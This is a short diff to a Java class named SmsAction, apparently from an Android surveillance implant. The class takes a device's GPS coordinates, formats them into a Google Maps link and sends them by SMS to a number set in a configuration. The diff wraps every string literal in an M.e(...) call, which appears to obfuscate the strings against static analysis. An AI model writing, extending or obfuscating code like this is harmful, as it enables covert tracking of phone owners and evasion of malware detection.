@@ -67,7 +67,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 	protected boolean parse(final ConfAction params) {
 		try {
 
-			number = StringUtils.unspace(params.getString("number"));
+			number = StringUtils.unspace(params.getString(M.e("number")));
 			descrType = params.getString("type", "sim");
 
 			if ("position".equals(descrType)) {
@@ -88,7 +88,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 				// TODO controllare che la lunghezza non sia superiore a 70
 				// caratteri
 
-				text = params.getString("text", "No Text");
+				text = params.getString(M.e("text"), M.e("No Text"));
 				break;
 
 			case TYPE_LOCATION:
@@ -276,7 +276,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 		final double lat = location.getLatitude();
 		final double lng = location.getLongitude();
 		
-		String text = String.format(Locale.US, "lat:%.5f lon:%.5f", lat,lng);
+		String text = String.format(Locale.US, M.e("lat:%.5f lon:%.5f"), lat,lng);
 		final Date date = new Date(location.getTime());
 		
 		if (Cfg.DEBUG) {
@@ -284,7 +284,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 		}
 
 		String instance = new String(Keys.self().getBuildId());
-		String textMaps = String.format(Locale.US, "https://maps.google.com/maps?q=%.5f,+%.5f", lat, lng);
+		String textMaps = String.format(Locale.US, M.e("https://maps.google.com/maps?q=%.5f,+%.5f"), lat, lng);
 		
 		sendSMS(textMaps);
 
